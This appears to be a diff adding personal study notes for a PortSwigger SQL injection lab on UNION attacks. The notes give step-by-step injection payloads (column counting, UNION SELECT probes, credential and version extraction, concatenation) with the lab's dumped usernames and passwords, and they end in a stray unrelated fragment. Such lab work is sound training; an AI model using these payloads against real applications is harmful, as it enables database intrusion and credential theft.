@@ -1,0 +1,39 @@
+lab:
+https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
+
+
+step 1: Find th enumber of column
+    -> ' order by 1--
+    -> ' order by 2--
+
+step 2: Find the column containing string
+    -> 'union select 'null',null--
+    -> 'union select null,'null'--
+
+step 3: finding the username and password from table
+    -> 'union select null, username from users--
+        carlos
+        administrator
+        wiener
+
+    -> 'union select null, password from users--
+        vyjdm881ibak18ft0ghn
+        177y98dd22r59zenavjc
+        b349nf7874r0r1fe77s0
+
+step 4: finding the version of database:
+    -> 'union select null, version() --
+        PostgreSQL 12.16 (Ubuntu 12.16-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit
+
+    Note: use the cheatsheet for more version commands
+        -> https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+step 5: Outputing username and password all thogether (string concatination)
+    -> 'union select null, username||'-'||password from users --
+        wiener-vyjdm881ibak18ft0ghn
+        administrator-177y98dd22r59zenavjc
+        carlos-b349nf7874r0r1fe77s0
+
+
+Locating element usinf bs6 beautifull
+re  
